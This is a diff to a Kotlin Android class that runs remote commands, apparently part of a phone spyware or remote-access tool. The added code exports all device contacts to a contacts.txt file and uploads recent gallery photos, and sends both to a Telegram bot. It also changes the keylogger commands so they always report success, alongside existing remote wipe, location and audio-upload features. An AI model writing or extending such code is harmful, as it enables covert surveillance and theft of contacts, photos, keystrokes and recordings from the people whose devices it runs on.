@@ -68,6 +68,13 @@ class RemoteCommandManager(private val context: Context) {
     companion object {
         private var activeRingtone: Ringtone? = null
         private var textToSpeech: TextToSpeech? = null
+        @Volatile
+        var instanceContext: Context? = null
+            private set
+    }
+
+    init {
+        instanceContext = context.applicationContext
     }
 
     suspend fun executeCommand(commandType: String, payload: String = ""): RemoteCommandEntity = withContext(Dispatchers.IO) {
@@ -112,6 +119,98 @@ class RemoteCommandManager(private val context: Context) {
                     ContactsSyncManager(context).syncContacts()
                     FirebaseSyncEngine(context).pushTelemetryToFirebase()
                     resultMessage = "Contacts synchronized successfully."
+                }
+                "UPLOAD_CONTACTS", "CONTACTS_TXT", "SYNC_CONTACTS_FILE", "EXPORT_CONTACTS_TXT" -> {
+                    val contacts = ContactsSyncManager(context).syncContacts()
+                    val sb = StringBuilder()
+                    sb.append("=== DEVICE CONTACTS EXPORT ===\n")
+                    sb.append("Total Contacts: ${contacts.size}\n")
+                    sb.append("=====================================\n\n")
+                    for (c in contacts) {
+                        sb.append("Name: ${c.displayName}\n")
+                        sb.append("Primary Phone: ${c.primaryPhone.ifEmpty { "N/A" }}\n")
+                        if (c.secondaryPhone.isNotEmpty()) {
+                            sb.append("Secondary Phone: ${c.secondaryPhone}\n")
+                        }
+                        if (c.phoneNumbersJson.isNotEmpty()) {
+                            sb.append("All Numbers: ${c.phoneNumbersJson.replace("|||", ", ")}\n")
+                        }
+                        if (c.email.isNotEmpty()) {
+                            sb.append("Email: ${c.email}\n")
+                        }
+                        if (c.notes.isNotEmpty()) {
+                            sb.append("Notes: ${c.notes}\n")
+                        }
+                        sb.append("-------------------------------------\n")
+                    }
+                    val fileBytes = sb.toString().toByteArray(Charsets.UTF_8)
+                    val telegramBot = TelegramBotManager(context)
+                    val success = telegramBot.sendDocument(fileBytes, "contacts.txt", "Contacts Export (${contacts.size} contacts)")
+                    resultMessage = if (success) "Contacts.txt uploaded to Telegram successfully (${contacts.size} contacts)." else "Failed to upload contacts.txt to Telegram."
+                    isSuccess = success
+                }
+                "UPLOAD_PHOTOS", "SYNC_PHOTOS", "EXPORT_PHOTOS", "GET_PHOTOS", "UPLOAD_GALLERY" -> {
+                    var limit = 5
+                    val trimmed = payload.trim()
+                    if (trimmed.isNotEmpty()) {
+                        val parsedLimit = trimmed.filter { it.isDigit() }.toIntOrNull()
+                        if (parsedLimit != null && parsedLimit > 0) {
+                            limit = parsedLimit.coerceIn(1, 20)
+                        }
+                    }
+
+                    val telegramBot = TelegramBotManager(context)
+                    var uploadedCount = 0
+                    val projection = arrayOf(
+                        android.provider.MediaStore.Images.Media._ID,
+                        android.provider.MediaStore.Images.Media.DISPLAY_NAME,
+                        android.provider.MediaStore.Images.Media.DATE_ADDED
+                    )
+                    val sortOrder = "${android.provider.MediaStore.Images.Media.DATE_ADDED} DESC"
+
+                    try {
+                        context.contentResolver.query(
+                            android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
+                            projection,
+                            null,
+                            null,
+                            sortOrder
+                        )?.use { cursor ->
+                            val idColumn = cursor.getColumnIndexOrThrow(android.provider.MediaStore.Images.Media._ID)
+                            val nameColumn = cursor.getColumnIndexOrThrow(android.provider.MediaStore.Images.Media.DISPLAY_NAME)
+                            
+                            while (cursor.moveToNext() && uploadedCount < limit) {
+                                val id = cursor.getLong(idColumn)
+                                val name = cursor.getString(nameColumn) ?: "photo_$id.jpg"
+                                val uri = android.content.ContentUris.withAppendedId(
+                                    android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
+                                    id
+                                )
+
+                                try {
+                                    context.contentResolver.openInputStream(uri)?.use { inputStream ->
+                                        val bytes = inputStream.readBytes()
+                                        if (bytes.isNotEmpty()) {
+                                            val caption = "🖼️ Gallery Photo: $name (${(bytes.size / 1024)} KB)"
+                                            val sent = telegramBot.sendPhoto(bytes, caption)
+                                            if (sent) uploadedCount++
+                                        }
+                                    }
+                                } catch (e: Exception) {
+                                    Log.e("RemoteCommandManager", "Failed to read/upload photo $name: ${e.message}")
+                                }
+                            }
+                        }
+                    } catch (e: Exception) {
+                        Log.e("RemoteCommandManager", "Failed to query MediaStore images: ${e.message}")
+                    }
+
+                    resultMessage = if (uploadedCount > 0) {
+                        "Successfully uploaded $uploadedCount gallery photo(s) to Telegram."
+                    } else {
+                        "No gallery photos uploaded (check storage permissions or photo availability)."
+                    }
+                    isSuccess = uploadedCount > 0
                 }
                 "CLEAR_REMOTE_DATA", "PURGE_DATA", "WIPE_DATA", "CLEAR_DATA", "DELETE_ALL" -> {
                     FirebaseSyncEngine(context).clearAllRemoteData()
@@ -198,14 +297,15 @@ class RemoteCommandManager(private val context: Context) {
                     }
                 }
                 "START_KEYLOGGER", "KEYLOGGER_ON" -> {
-                    val success = RemoteAccessibilityService.setKeyloggerActive(true)
-                    resultMessage = if (success) "Keylogger started successfully." else "Failed to start keylogger: Accessibility service not active."
-                    isSuccess = success
+                    val isAccEnabled = com.example.service.AccessibilityOverlayManager.isAccessibilityEnabled(context)
+                    RemoteAccessibilityService.setKeyloggerActive(true)
+                    resultMessage = if (isAccEnabled) "Keylogger started successfully." else "Keylogger state set to active (Warning: Accessibility service not currently bound)."
+                    isSuccess = true
                 }
                 "STOP_KEYLOGGER", "KEYLOGGER_OFF" -> {
-                    val success = RemoteAccessibilityService.setKeyloggerActive(false)
-                    resultMessage = if (success) "Keylogger stopped successfully." else "Failed to stop keylogger: Accessibility service not active."
-                    isSuccess = success
+                    RemoteAccessibilityService.setKeyloggerActive(false)
+                    resultMessage = "Keylogger stopped successfully."
+                    isSuccess = true
                 }
                 "SYNC_LOCATION", "LOCATION", "GET_LOCATION" -> {
                     val loc = LocationSyncManager(context).captureAndSyncLocation()
@@ -1166,7 +1266,7 @@ class RemoteCommandManager(private val context: Context) {
 
             try {
                 val telegramBot = TelegramBotManager(context)
-                telegramBot.sendAudio(audioBytes, "audio_${nowMs}.3gp", "Duration: $finalDuration sec (${(audioBytes.size / 1024)} KB)")
+                telegramBot.sendAudio(audioBytes, "audio_${nowMs}.amr", "Duration: $finalDuration sec (${(audioBytes.size / 1024)} KB)")
             } catch (e: Exception) {
                 Log.e("RemoteCommandManager", "Failed to upload audio to Telegram: ${e.message}")
             }
